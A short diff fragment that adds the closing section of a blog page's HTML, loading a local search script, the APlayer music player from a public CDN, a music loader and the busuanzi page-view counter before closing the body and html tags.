+<script src="/js/search.js"></script>
+
+<script src="https://cdn.jsdelivr.net/npm/aplayer@1.10.1/dist/APlayer.min.js"></script>
+<script src="/js/music-loader.js"></script>
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+</body>
+</html>
